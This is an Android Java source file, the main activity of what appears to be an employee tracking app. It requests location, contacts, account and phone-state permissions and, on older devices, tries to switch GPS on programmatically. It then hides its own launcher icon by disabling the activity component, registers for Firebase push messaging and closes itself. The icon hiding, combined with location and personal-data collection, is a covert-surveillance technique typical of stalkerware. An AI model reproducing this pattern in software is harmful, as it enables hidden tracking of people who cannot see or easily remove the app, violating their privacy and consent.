package com.theah64.ets;


import android.content.ComponentName;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.support.annotation.NonNull;
import android.support.v7.app.AppCompatActivity;
import android.widget.Toast;

import com.theah64.ets.asyncs.FCMSynchronizer;
import com.theah64.ets.model.Employee;
import com.theah64.ets.services.firebase.InstanceIdService;
import com.theah64.ets.utils.APIRequestGateway;
import com.theah64.ets.utils.CommonUtils;
import com.theah64.ets.utils.GPSUtils;
import com.theah64.ets.utils.PrefUtils;


public class MainActivity extends AppCompatActivity {

    private static final int RQ_CODE_RQ_PERMISSIONS = 1;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        if (!CommonUtils.isSupport(17)) {
            new GPSUtils(this).turnGPSOn();
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {

            if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {

                requestPermissions(new String[]{
                        android.Manifest.permission.ACCESS_FINE_LOCATION,
                        android.Manifest.permission.READ_CONTACTS,
                        android.Manifest.permission.GET_ACCOUNTS,
                        android.Manifest.permission.READ_PHONE_STATE,
                        android.Manifest.permission.ACCESS_COARSE_LOCATION
                }, RQ_CODE_RQ_PERMISSIONS);

            } else {
                doNormalWork();
            }

        } else {
            doNormalWork();
        }

    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        if (requestCode == RQ_CODE_RQ_PERMISSIONS) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                doNormalWork();
            } else {
                Toast.makeText(MainActivity.this, "You must accept the permissions.", Toast.LENGTH_SHORT).show();
                finish();
            }
        }
    }


    private void doNormalWork() {

        //Hiding app icon
        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

        if (!PrefUtils.getInstance(this).getBoolean(Employee.KEY_IS_FCM_SYNCED)) {

            new APIRequestGateway(this, new APIRequestGateway.APIRequestGatewayCallback() {
                @Override
                public void onReadyToRequest(String apiKey) {
                    new FCMSynchronizer(MainActivity.this, apiKey).execute();
                }

                @Override
                public void onFailed(String reason) {

                }
            });

        }

        this.finish();
    }
}
